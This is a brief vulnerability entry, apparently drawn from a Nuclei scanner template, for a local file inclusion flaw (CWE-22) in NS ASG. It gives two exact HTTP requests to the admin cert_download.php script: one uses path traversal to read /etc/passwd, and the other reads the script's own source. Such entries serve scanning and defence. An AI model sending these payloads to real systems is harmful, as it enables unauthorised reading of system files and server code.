# Vulnerability: NS ASG - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`ns-asg-file-read.yaml`)

## Description
NS ASG is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/admin/cert_download.php?file=pqpqpqpq.txt&certfile=../../../../../../../../etc/passwd
GET {{BaseURL}}/admin/cert_download.php?file=pqpqpqpq.txt&certfile=cert_download.php
```

